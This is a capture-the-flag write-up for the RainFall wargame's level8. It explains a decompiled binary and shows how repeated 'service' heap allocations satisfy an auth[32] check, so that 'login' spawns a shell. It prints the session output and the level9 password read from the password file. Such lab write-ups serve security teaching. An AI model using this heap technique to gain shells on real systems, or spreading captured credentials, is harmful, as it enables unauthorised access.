## Description
By decompiline the ASM we can observe it is an infinite user's prompt.
It triggers behaviour by sending the following commands
* "auth "
* "reset"
* "service"
* "login"

##Commands
Each commands has specific behavior
* "auth "
Allocate 4 bytes of memory and assign a pointer to it at \<auth\> address (0x8049aac)
It then perform `strcpy` but that doesn't interest us.

* "reset"
Frees \<auth\>

* "service"
strdup the input after "service" substring to \<service> address (0x8049ab0)

* "login"
This is what interest us as it will allow us to access a shell with level9 permissions
```
if (((uint8_t*)auth)[32] != 0) {
  system("/bin/sh");
}
```
This tells us that if the byte located at pointer's index 32 is not equal to 0x0, it will execute "/bin/sh"

## Solution
By executing the binary, we can see the following
```(nil), (nil)```

Sending commands as input such as "auth " or "service" will display their respective allocated memory pointer on the heap
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```
If we type in `service` a second time
```
0x804a008, 0x804a028
```
Notice the difference between those two addresse equals `0x20`, which is `32`
This is what we are looking for
Then type `"auth "`, and we get access to the shell
```
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
